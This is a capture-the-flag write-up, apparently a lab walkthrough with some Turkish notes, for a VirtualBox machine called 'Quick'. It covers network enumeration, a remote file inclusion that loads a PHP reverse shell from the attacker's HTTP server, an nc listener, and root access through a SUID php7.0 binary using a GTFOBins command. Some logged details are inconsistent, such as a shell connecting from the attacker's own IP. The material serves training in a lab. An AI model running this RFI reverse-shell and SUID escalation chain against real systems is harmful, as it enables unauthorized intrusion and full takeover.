@@ -1,1 +1,328 @@
+			ENUMERATION
+
+
+---ifconfig---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 15  bytes 4022 (3.9 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 54  bytes 6217 (6.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      2     120  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      2     120  Unknown vendor              
+ 10.0.2.3        08:00:27:e3:75:da      2     120  PCS Systemtechnik GmbH      
+ 10.0.2.32       08:00:27:41:d3:56      2     120  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+    
+
+
+
+---nmap on our target---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.32 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 13:00 +03
+Nmap scan report for 10.0.2.32
+Host is up (0.00074s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Quick Automative
+MAC Address: 08:00:27:41:D3:56 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.74 ms 10.0.2.32
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.46 seconds
+            
+
+
+---I ran dirb and gobuster scans on the website to see some hidden pages but didn't find anything useful---
+                                                                                
+
+---lets run a nikto scan too, maybe we can find some more details---
+
+
+Nikto: Web server'larında açık var mı yok mu bulmaya yarayan bir tool. Kali'nin içinde yüklü
+
+
+┌──(root㉿kali)-[/opt]
+└─# nikto -h 10.0.2.32
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.32
++ Target Hostname:    10.0.2.32
++ Target Port:        80
++ Start Time:         2024-04-02 14:53:32 (GMT3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
++ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /images/: Directory indexing found.
++ /index.php: Output from the phpinfo() function was found.
++ /index.php?page=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
++ 8102 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2024-04-02 14:53:57 (GMT3) (25 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+---here we see that nikto found an RFI vulnerability as well 
+'/index.php?page=' within this page---
+
+
+---while we are browsing the website we see that url changes from page to page, this indicates 
+that there might be a LFI (Local File Inclusion) vulnerability---
+
+LFI: Is an ttack technique where the attackers trick a web app into running or exposing
+files on a web server. They expose sensitive information, can lead to XSS and remote code
+execution. Uzaktan dosya ekleyerek kod çalıştırmaktır.
+
+
+
+---To exploit this we can upload a php file and have a reverse shell connection---
+
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server                      
+  
+
+---And I create a reverse php shell in /home/okina and change the ip and port of the connection--- 
+
+$ip = '10.0.2.15';  
+$port = 5050;  
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 5050             
+listening on [any] 5050 ...
+
+
+
+
+---now come to the website and rewrite the link so that our python server connection is complete
+and we have a a conncetion---
+
+http://10.0.2.32/index.php?page=http://10.0.2.15:8000/rev 
+
+
+
+
+				GAINING FOOTHOLD
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lnvp 5050
+listening on [any] 5050 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.15] 39816
+Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux
+ 15:34:10 up  2:42,  1 user,  load average: 0.03, 0.10, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+okina    tty2     -                14:47    2:41m 42.51s  0.02s /usr/libexec/gnome-session-binary
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami    
+www-data
+
+
+---we accessed, lets upgrade and stabilize our shell and check for our first user flag---
+
+$ python3 -c 'import pty;pty.spawn("/bin/
+
+www-data@quick:/home$ ls
+ls
+andrew
+www-data@quick:/home$ cd andrew	
+cd andrew
+www-data@quick:/home/andrew$ ls
+ls
+snap  user.txt
+www-data@quick:/home/andrew$ cat user.txt
+cat user.txt
+                                 _________
+                          _.--""'-----,   `"--.._
+                       .-''   _/_      ; .'"----,`-,
+                     .'      :___:     ; :      ;;`.`.
+                    .      _.- _.-    .' :      ::  `..
+                 __;..----------------' :: ___  ::   ;;
+            .--"". '           ___.....`:=(___)-' :--'`.
+          .'   .'         .--''__       :       ==:    ;
+      .--/    /        .'.''     ``-,   :         :   '`-.
+   ."', :    /       .'-`\\       .--.\ :         :  ,   _\
+  ;   ; |   ;       /:'  ;;      /__  \\:         :  :  /_\\
+  |\_/  |   |      / \__//      /"--\\ \:         :  : ;|`\|    
+  : "  /\__/\____//   """      /     \\ :         :  : :|'||
+["""""""""--------........._  /      || ;      __.:--' :|//|
+ "------....______         ].'|      // |--"""'__...-'`\ \//
+   `|First User Flag|.--'": :  \    //  |---"""      \__\_/
+     """""""""'            \ \  \_.//  /
+       `---'                \ \_     _'
+                             `--`---'  
+                             
+
+                             
+
+
+
+
+				PRIVILEGE ESCALATION
+
+
+---I tried using linpeas but we dont have permission to do so---
+
+---Let's look for possible SUID's so that our user can run commands if there's vulnerability---
+
+SETUID = SUID
+
+
+www-data@quick:/home/andrew$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/snap/core20/1828/usr/bin/chfn
+/snap/core20/1828/usr/bin/chsh
+/snap/core20/1828/usr/bin/gpasswd
+/snap/core20/1828/usr/bin/mount
+/snap/core20/1828/usr/bin/newgrp
+/snap/core20/1828/usr/bin/passwd
+/snap/core20/1828/usr/bin/su
+/snap/core20/1828/usr/bin/sudo
+/snap/core20/1828/usr/bin/umount
+/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1828/usr/lib/openssh/ssh-keysign
+/snap/core20/2182/usr/bin/chfn
+/snap/core20/2182/usr/bin/chsh
+/snap/core20/2182/usr/bin/gpasswd
+/snap/core20/2182/usr/bin/mount
+/snap/core20/2182/usr/bin/newgrp
+/snap/core20/2182/usr/bin/passwd
+/snap/core20/2182/usr/bin/su
+/snap/core20/2182/usr/bin/sudo
+/snap/core20/2182/usr/bin/umount
+/snap/core20/2182/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2182/usr/lib/openssh/ssh-keysign
+/snap/snapd/21184/usr/lib/snapd/snap-confine
+/snap/snapd/18357/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/php7.0
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/fusermount
+
+
+---in this list, the php7.0 picks an interest, I go to gtfobins to search for potential ways
+to get root user---
+
+
+---in https://gtfobins.github.io/gtfobins/php/#suid I see the needed commands---
+
+CMD="/bin/sh"
+./php -r "pcntl_exec('/bin/sh', ['-p']);"
+
+
+
+---let's write em and get the root flag---
+
+www-data@quick:/home/andrew$ CMD="/bin/sh"    
+CMD="/bin/sh"
+www-data@quick:/home/andrew$ /usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
+</usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
+
+# whoami
+whoami
+root
+# pwd
+pwd
+/home/andrew
+# cd ..
+cd ..
+# cd ..
+cd ..
+# ls
+ls
+bin    dev   lib    libx32	mnt   root  snap      sys  var
+boot   etc   lib32  lost+found	opt   run   srv       tmp
+cdrom  home  lib64  media	proc  sbin  swap.img  usr
+# cd root
+cd root
+# ls
+ls
+root.txt  snap
+# cat root.txt	
+cat root.txt
+
+            ___.............___
+         ,dMMMMMMMMMMMMMMMMMMMMMb.
+        dMMMMMMMMMMMMMMMMMMMMMMMMMb
+        |        | -_  - |        |
+        |        |_______|___     |
+        |     ___......./'.__`\   |
+        |_.-~"               `"~-.|
+        7\         _...._        |`.
+       /  l     .-'      `-.     j  \
+      :   .qp. / __________ \ .qp.   :
+      |  d8888b |          | d8888b  |
+  .---:  `Y88P|_|__________|_|Y88P'\/`"-.
+ /     : /,------------------------.:    \
+:      |`.    | | [_FLAG_] ||     ,'|     :
+`\.____|  `.  : `.________.'|   ,'  |____.'
+  MMMMM|   |  |`-.________.-|  /    |MMMMM 
+ .-------------`------------'-'-----|-----.
+(___---------Root User Flag-------------__)
+  MMMMMM                            MMMMMM 
+  `MMMM'                            `MMMM'
+
 
